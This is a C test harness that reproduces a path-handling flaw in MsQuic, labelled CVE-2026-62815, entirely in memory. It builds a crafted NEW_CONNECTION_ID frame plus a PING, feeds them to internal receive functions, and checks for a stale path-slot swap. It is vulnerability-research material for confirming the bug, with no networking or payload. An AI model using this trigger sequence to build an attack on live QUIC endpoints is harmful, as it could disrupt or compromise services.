/*
 * Lab-only frame-level core harness for MsQuic CVE-2026-62815.
 *
 * Encodes a real NEW_CONNECTION_ID frame ( retire-prior-to advance that leaves
 * no spare destination CID, so the non-active path is removed by
 * QuicConnOnRetirePriorToUpdated ) followed by a PING (non-probing frame),
 * runs the pinned frame decoder + QuicConnRecvFrames, then calls
 * QuicConnRecvPostProcessing with the same raw QUIC_PATH* the receive loop
 * passes. No TLS, no sockets, no wire packets: still rung-3 core state only.
 */
#include "precomp.h"
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

BOOLEAN QuicConnRecvFrames(QUIC_CONNECTION* Connection, QUIC_PATH* Path, QUIC_RX_PACKET* Packet, CXPLAT_ECN_TYPE ECN);
void QuicConnRecvPostProcessing(QUIC_CONNECTION* Connection, QUIC_PATH** Path, QUIC_RX_PACKET* Packet);

static
QUIC_STATUS
NoopConnCallback(
    HQUIC Connection,
    void* Context,
    QUIC_CONNECTION_EVENT* Event
    )
{
    UNREFERENCED_PARAMETER(Connection);
    UNREFERENCED_PARAMETER(Context);
    UNREFERENCED_PARAMETER(Event);
    return QUIC_STATUS_SUCCESS;
}

static
void
NoopCcReset(
    QUIC_CONGESTION_CONTROL* Cc,
    BOOLEAN FullReset
    )
{
    UNREFERENCED_PARAMETER(Cc);
    UNREFERENCED_PARAMETER(FullReset);
}

int
main(void)
{
    setvbuf(stdout, NULL, _IONBF, 0);
    QUIC_CONNECTION* Conn = (QUIC_CONNECTION*)calloc(1, sizeof(QUIC_CONNECTION));
    if (Conn == NULL) {
        return 2;
    }

    QUIC_CID_LIST_ENTRY ActiveCid, RetiredCid, BusyCid;
    memset(&ActiveCid, 0, sizeof(ActiveCid));
    memset(&RetiredCid, 0, sizeof(RetiredCid));
    memset(&BusyCid, 0, sizeof(BusyCid));
    RetiredCid.CID.Retired = FALSE; /* the NEW_CONNECTION_ID frame retires it */
    RetiredCid.CID.UsedLocally = TRUE;
    RetiredCid.CID.SequenceNumber = 0;
    RetiredCid.CID.Length = 8;
    BusyCid.CID.UsedLocally = TRUE; /* peer's CID is already assigned: no spare */
    BusyCid.CID.SequenceNumber = 1;
    BusyCid.CID.Length = 8;

    CxPlatListInitializeHead(&Conn->DestCids);
    CxPlatListInsertTail(&Conn->DestCids, &RetiredCid.Link);
    CxPlatListInsertTail(&Conn->DestCids, &BusyCid.Link);
    Conn->DestCidCount = 2;
    Conn->Paths[0].SmoothedRtt = 100000;
    Conn->Paths[0].RttVariance = 10000;
    Conn->Paths[1].SmoothedRtt = 100000;
    Conn->Paths[1].RttVariance = 10000;
    Conn->RetirePriorTo = 0;

    Conn->PathsCount = 2;
    Conn->ClientCallbackHandler = NoopConnCallback;
    Conn->CongestionControl.QuicCongestionControlReset = NoopCcReset;

    Conn->Paths[0].InUse = TRUE;
    Conn->Paths[0].IsActive = TRUE;
    Conn->Paths[0].ID = 10;
    Conn->Paths[0].DestCid = &ActiveCid;
    Conn->Paths[0].GotValidPacket = TRUE;

    Conn->Paths[1].InUse = TRUE;
    Conn->Paths[1].IsActive = FALSE;
    Conn->Paths[1].ID = 99;
    Conn->Paths[1].DestCid = &RetiredCid;
    Conn->Paths[1].GotValidPacket = TRUE;

    QUIC_PATH* Path = &Conn->Paths[1];

    QUIC_NEW_CONNECTION_ID_EX Frame;
    memset(&Frame, 0, sizeof(Frame));
    Frame.Length = 8;
    Frame.Sequence = 1;
    Frame.RetirePriorTo = 1;  /* advance retire-prior-to over the retired CID */
    memset(Frame.Buffer, 0xAB, 8);
    memset(Frame.Buffer + 8, 0xCD, QUIC_STATELESS_RESET_TOKEN_LENGTH);

    uint8_t Payload[256];
    uint16_t Offset = 0;
    if (!QuicNewConnectionIDFrameEncode(&Frame, &Offset, sizeof(Payload), Payload)) {
        printf("FAIL: frame encode\n");
        return 3;
    }
    Payload[Offset++] = QUIC_FRAME_PING;

    QUIC_RX_PACKET Packet;
    memset(&Packet, 0, sizeof(Packet));
    Packet.AvailBuffer = Payload;
    Packet.HeaderLength = 0;
    Packet.PayloadLength = Offset;
    Packet.KeyType = QUIC_PACKET_KEY_1_RTT;
    Packet.DestCidLen = 0;
    Packet.NewLargestPacketNumber = TRUE; /* packet-level property, set by real recv path */

    printf("FRAMES: NEW_CONNECTION_ID(seq=1, retire_prior_to=1) + PING, payload=%u bytes\n", Offset);
    printf("BEFORE frames: count=%u p0(ID=%u inuse=%d) p1(ID=%u inuse=%d retired_cid=%d)\n",
        Conn->PathsCount,
        Conn->Paths[0].ID, Conn->Paths[0].InUse,
        Conn->Paths[1].ID, Conn->Paths[1].InUse,
        RetiredCid.CID.Retired);

    BOOLEAN FramesOk = QuicConnRecvFrames(Conn, Path, &Packet, 0);
    printf("AFTER frames:  ok=%d count=%u p0(ID=%u inuse=%d) p1(ID=%u inuse=%d) nonprobing=%d stale=%s\n",
        FramesOk, Conn->PathsCount,
        Conn->Paths[0].ID, Conn->Paths[0].InUse,
        Conn->Paths[1].ID, Conn->Paths[1].InUse,
        Packet.HasNonProbingFrame,
        Path == &Conn->Paths[1] ? "Paths[1]" : "moved");

    if (!FramesOk) {
        printf("FAIL: frame processing rejected the crafted frames\n");
        return 4;
    }

    QuicConnRecvPostProcessing(Conn, &Path, &Packet);
    printf("AFTER post:    count=%u p0(ID=%u inuse=%d active=%d) p1(ID=%u inuse=%d active=%d)\n",
        Conn->PathsCount,
        Conn->Paths[0].ID, Conn->Paths[0].InUse, Conn->Paths[0].IsActive,
        Conn->Paths[1].ID, Conn->Paths[1].InUse, Conn->Paths[1].IsActive);

    int Swapped = (Conn->Paths[0].ID == 99 && Conn->Paths[1].ID == 10);
    printf("VERDICT: frame-driven stale-slot swap %s\n", Swapped ? "OBSERVED" : "NOT OBSERVED");

    free(Conn);
    return Swapped ? 1 : 0;
}
